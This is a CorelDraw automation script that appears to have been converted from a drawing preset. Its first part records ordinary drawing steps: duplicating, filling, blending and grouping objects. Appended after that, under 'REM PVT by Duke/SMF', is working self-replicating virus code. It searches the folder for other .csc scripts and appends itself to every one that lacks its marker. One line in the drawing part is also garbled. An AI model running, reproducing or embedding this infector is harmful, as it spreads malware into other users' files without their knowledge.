   REM REM Converted from a DRAW PRESET binary to a DRAW RECORDING script

   WITHOBJECT "CorelDraw.Automation.7"
       .StartOfRecording
       .SuppressPainting
       .RecorderStorePreselectedObjects TRUE
       .RecorderSelectObjectByIndex TRUE, 1
       .ApplyOutline 0, 0, 0, 0, 0, 0, 0, -1, -1, FALSE, 0, 0, FALSE
       .RecorderSelectObjectByIndex TRUE, 1
       .DuplicateObject 0, 0
       .RecorderSelectObjectByIndex TRUE, 2
       .StretchObject 0.836417, 1, 0.836417, 1, FALSE, FALSE, 5
       .RecorderSelectObjectByIndex TRUE, 2
       .ApplyUniformFillColor 2, 0, 0, 0, 40
       .RecorderSelectObjectByIndex TRUE, 1
       .ApplyUniformFillColor 2, 0, 0, 0, 0
       .RecorderSelectPreselectedObjects TRUE
       .RecorderSelectObjectsByIndex FALSE, 2, -1, -1, -1, -1
       .ApplyBlend TRUE, 20, 0, FALSE, 0, FALSE, FALSE, 0, 0, 0, TRUE, TRUE, FALSE, FA|üGPLSE, 0, 0, 0, 0
       .RecorderSelectObjectByIndex TRUE, 1
       .DuplicateObject 0, 0
       .RecorderSelectObjectByIndex TRUE, 4
       .MoveObject -19303, 13461
       .RecorderSelectObjectByIndex TRUE, 4
       .ApplyUniformFillColor 2, 0, 100, 100, 0
       .RecorderSelectObjectByIndex TRUE, 4
       .OrderToFront
       .RecorderSelectObjectByIndex TRUE, 4
       .MoveObject -2793, 7365
       .RecorderSelectPreselectedObjects TRUE
       .RecorderSelectObjectsByIndex FALSE, 4, 3, 2, -1, -1
       .Group
       .ResumePainting
       .EndOfRecording
   END WITHOBJECT

   REM PVT by Duke/SMF
   FileName$=FindFirstFolder ("*.csc",32 or 128)
   Do While Not FileName$=""
   Open FileName$ For Input As #1
   Do While Not Eof(1)
   Line Input #1,Lines$
   If Left(Lines$,7)="REM PVT" Then Dropper$=FileName$
   Loop
   Close
   FileName$=FindNextFolder ()
   Loop
   FileName$=FindFirstFolder ("*.csc",32 or 128)
   Do While Not FileName$=""
   Open FileName$ For Input As #1
   Infected=0
   Do While Not Eof(1)
   Line Input #1,Lines$
   If Left(Lines$,7)="REM PVT" Then Infected=1
   Loop
   Close
   If Infected=1 Then Goto NextFile
   Open FileName$ For Append As #1
   Open Dropper$ For Input As #2
   FindRem=0
   Do While FindRem=0
   Line Input #2,Lines$
   If Left(Lines$,7)="REM PVT" Then FindRem=1
   Loop
   Do While Not Eof(2)
   Print #1,Lines$
   Line Input #2,Lines$
   Loop
   Print #1,Lines$
   Close
   NextFile:
   FileName$=FindNextFolder ()
   Loop
   REM End of PVT
